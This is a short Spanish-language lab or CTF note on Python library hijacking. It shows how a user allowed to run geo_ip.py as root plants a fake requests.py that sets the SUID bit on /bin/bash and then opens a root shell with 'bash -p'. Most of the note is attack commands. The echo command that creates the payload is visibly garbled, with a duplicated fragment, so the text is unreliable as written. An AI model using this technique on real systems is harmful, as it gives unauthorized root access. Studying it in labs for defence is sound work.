En términos generales, **"Library Hijacking"** se basa en **inyectar o sustituir una biblioteca legítima** con una versión modificada por el atacante, de forma que el sistema o aplicación con privilegios elevados cargue y ejecute esa biblioteca manipulada.

![[Pasted image 20250616183814.png]]

El usuario **iker** puede ejecutar como **root** el script **geo_ip.py**. El script contiene el siguiente código:

```
import requests; 
ip = input('Introduce la direccion IP que quieras geolocalizar: ')
respuesta = requests.get(f'http://ip-api.com/json/{ip}')
data = respuesta.json()
print(data)
```
Vemos que importa la librería **requests**, la cual intentaremos secuestrar de la siguiente forma:

```
echo "import os;os.syecho "import os;os.system('chmod u+s /bin/bash')" > requests.py
```

Creamos un script en python con el mismo nombre de la librería en uso en **geo_ip.py**, de manera que este se ejecutará como root y colocara privilegios ***SUID*** a la ****/bin/bash***.

Ahora, ejecutaremos el script:

```
sudo /usr/bin/python3 /home/iker/geo_ip.py
```

Para finalizar, ejecutamos la bash con privilegios:

```
/bin/bash -p
```
